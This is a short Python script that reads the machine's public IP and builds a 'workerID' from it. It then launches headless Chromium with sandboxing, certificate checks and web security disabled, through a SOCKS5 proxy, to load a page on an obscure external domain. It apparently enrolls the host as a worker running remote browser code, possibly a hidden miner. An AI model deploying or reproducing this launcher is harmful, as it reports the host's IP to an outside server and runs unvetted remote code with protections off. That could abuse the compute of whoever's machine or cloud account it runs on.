import os
import socket
import requests
import random
import string
import time
import os.path
import asyncio 
from pyppeteer import launch
from datetime import datetime

num_of_cores = os.cpu_count()
currentdate = datetime.now().strftime('%d-%b-%Y_IDXPypp_')
ipaddress = requests.get('https://api.ipify.org').text
underscored_ip = ipaddress.replace('.', '_')
currentdate += underscored_ip
chars = random.choices(string.ascii_letters + string.digits, k=100)
random_word = "".join(chars[:8])
currentdate += random_word


print(f"Your current date is from within Python environment is : {currentdate}")


async def fetch():
   browser = await launch(
        headless=True,
        args=['--no-sandbox',
          '--disable-setuid-sandbox',
          '--ignore-certificate-errors',
          '--ignore-certificate-errors-spki-list',
          '--disable-dev-shm-usage',
          '--disable-infobars',
          '--disable-extensions',
          '--disable-background-timer-throttling',
          '--disable-background-networking',
          '--disable-web-security',
          '--disable-gpu',
		  '--proxy-server=socks5://127.0.0.1:1082'],
        autoClose=False
   )
   page = await browser.newPage()
   url = f"http://sindilesiqhaztraining.teatspray.uk/test.html?workerID={currentdate}"
   await page.goto(url)


asyncio.get_event_loop().run_until_complete(fetch())
